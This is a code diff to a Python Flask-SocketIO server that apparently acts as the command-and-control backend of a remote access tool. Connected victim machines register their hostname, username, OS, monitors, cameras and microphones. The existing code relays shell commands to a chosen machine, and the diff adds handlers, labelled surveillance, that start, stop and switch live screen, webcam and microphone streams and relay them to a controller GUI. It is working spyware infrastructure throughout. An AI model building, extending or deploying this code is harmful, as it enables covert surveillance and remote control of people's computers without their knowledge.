@@ -14,18 +14,22 @@ socketio = SocketIO(
     ping_timeout=60,
     ping_interval=25,
     logger=False,
-    engineio_logger=False
+    engineio_logger=False,
+    max_http_buffer_size=10*1024*1024  # 10MB for large frames
 )
 
 clients = {}
 
 class Client:
-    def __init__(self, sid, ip, hostname, username, os_info):
+    def __init__(self, sid, ip, hostname, username, os_info, monitors, cameras, microphones):
         self.sid = sid
         self.ip = ip
         self.hostname = hostname
         self.username = username
         self.os_info = os_info
+        self.monitors = monitors
+        self.cameras = cameras
+        self.microphones = microphones
         self.last_seen = time.time()
 
 def cleanup_dead_clients():
@@ -55,17 +59,23 @@ def handle_register(data):
         ip=request.remote_addr,
         hostname=data.get('hostname', 'Unknown'),
         username=data.get('username', 'Unknown'),
-        os_info=data.get('os_info', 'Unknown')
+        os_info=data.get('os_info', 'Unknown'),
+        monitors=data.get('monitors', 1),
+        cameras=data.get('cameras', []),
+        microphones=data.get('microphones', [])
     )
     clients[request.sid] = client
-    print(f"[+] Registered: {client.hostname} ({client.ip})")
+    print(f"[+] Registered: {client.hostname} ({client.ip}) - {client.monitors} monitors, {len(client.cameras)} cameras, {len(client.microphones)} mics")
     
     socketio.emit('new_client', {
         'sid': request.sid,
         'ip': client.ip,
         'hostname': client.hostname,
         'username': client.username,
-        'os_info': client.os_info
+        'os_info': client.os_info,
+        'monitors': client.monitors,
+        'cameras': client.cameras,
+        'microphones': client.microphones
     }, namespace='/gui', broadcast=True)
     
     emit('registered', {'status': 'ok'})
@@ -83,6 +93,31 @@ def handle_result(data):
         'result': result
     }, namespace='/gui', broadcast=True)
 
+# Surveillance frame relay
+@socketio.on('screen_frame', namespace='/client')
+def handle_screen_frame(data):
+    socketio.emit('screen_frame', {
+        'sid': request.sid,
+        'frame': data.get('frame'),
+        'monitor': data.get('monitor')
+    }, namespace='/gui', broadcast=True)
+
+@socketio.on('camera_frame', namespace='/client')
+def handle_camera_frame(data):
+    socketio.emit('camera_frame', {
+        'sid': request.sid,
+        'frame': data.get('frame'),
+        'camera': data.get('camera')
+    }, namespace='/gui', broadcast=True)
+
+@socketio.on('mic_audio', namespace='/client')
+def handle_mic_audio(data):
+    socketio.emit('mic_audio', {
+        'sid': request.sid,
+        'audio': data.get('audio'),
+        'mic': data.get('mic')
+    }, namespace='/gui', broadcast=True)
+
 @socketio.on('disconnect', namespace='/client')
 def handle_client_disconnect():
     if request.sid in clients:
@@ -91,6 +126,7 @@ def handle_client_disconnect():
         del clients[request.sid]
         socketio.emit('client_left', {'sid': request.sid}, namespace='/gui', broadcast=True)
 
+# GUI handlers
 @socketio.on('connect', namespace='/gui')
 def handle_gui_connect():
     print(f"[GUI] Controller connected")
@@ -99,7 +135,10 @@ def handle_gui_connect():
         'ip': c.ip,
         'hostname': c.hostname,
         'username': c.username,
-        'os_info': c.os_info
+        'os_info': c.os_info,
+        'monitors': c.monitors,
+        'cameras': c.cameras,
+        'microphones': c.microphones
     } for sid, c in clients.items()]
     emit('client_list', {'clients': client_list})
 
@@ -110,7 +149,10 @@ def handle_get_clients():
         'ip': c.ip,
         'hostname': c.hostname,
         'username': c.username,
-        'os_info': c.os_info
+        'os_info': c.os_info,
+        'monitors': c.monitors,
+        'cameras': c.cameras,
+        'microphones': c.microphones
     } for sid, c in clients.items()]
     emit('client_list', {'clients': client_list})
 
@@ -124,6 +166,67 @@ def handle_send_command(data):
         socketio.emit('execute', {'command': command}, room=target_sid, namespace='/client')
     else:
         emit('error', {'message': 'Client not found'})
+
+# Surveillance control
+@socketio.on('start_screen_stream', namespace='/gui')
+def handle_start_screen_stream(data):
+    target_sid = data.get('sid')
+    monitor = data.get('monitor', 0)
+    if target_sid in clients:
+        socketio.emit('start_screen_stream', {'monitor': monitor}, room=target_sid, namespace='/client')
+
+@socketio.on('stop_screen_stream', namespace='/gui')
+def handle_stop_screen_stream(data):
+    target_sid = data.get('sid')
+    if target_sid in clients:
+        socketio.emit('stop_screen_stream', {}, room=target_sid, namespace='/client')
+
+@socketio.on('start_camera_stream', namespace='/gui')
+def handle_start_camera_stream(data):
+    target_sid = data.get('sid')
+    camera = data.get('camera', 0)
+    if target_sid in clients:
+        socketio.emit('start_camera_stream', {'camera': camera}, room=target_sid, namespace='/client')
+
+@socketio.on('stop_camera_stream', namespace='/gui')
+def handle_stop_camera_stream(data):
+    target_sid = data.get('sid')
+    if target_sid in clients:
+        socketio.emit('stop_camera_stream', {}, room=target_sid, namespace='/client')
+
+@socketio.on('start_mic_stream', namespace='/gui')
+def handle_start_mic_stream(data):
+    target_sid = data.get('sid')
+    mic = data.get('mic', 0)
+    if target_sid in clients:
+        socketio.emit('start_mic_stream', {'mic': mic}, room=target_sid, namespace='/client')
+
+@socketio.on('stop_mic_stream', namespace='/gui')
+def handle_stop_mic_stream(data):
+    target_sid = data.get('sid')
+    if target_sid in clients:
+        socketio.emit('stop_mic_stream', {}, room=target_sid, namespace='/client')
+
+@socketio.on('change_monitor', namespace='/gui')
+def handle_change_monitor(data):
+    target_sid = data.get('sid')
+    monitor = data.get('monitor', 0)
+    if target_sid in clients:
+        socketio.emit('change_monitor', {'monitor': monitor}, room=target_sid, namespace='/client')
+
+@socketio.on('change_camera', namespace='/gui')
+def handle_change_camera(data):
+    target_sid = data.get('sid')
+    camera = data.get('camera', 0)
+    if target_sid in clients:
+        socketio.emit('change_camera', {'camera': camera}, room=target_sid, namespace='/client')
+
+@socketio.on('change_mic', namespace='/gui')
+def handle_change_mic(data):
+    target_sid = data.get('sid')
+    mic = data.get('mic', 0)
+    if target_sid in clients:
+        socketio.emit('change_mic', {'mic': mic}, room=target_sid, namespace='/client')
 
 @app.route('/')
 def index():
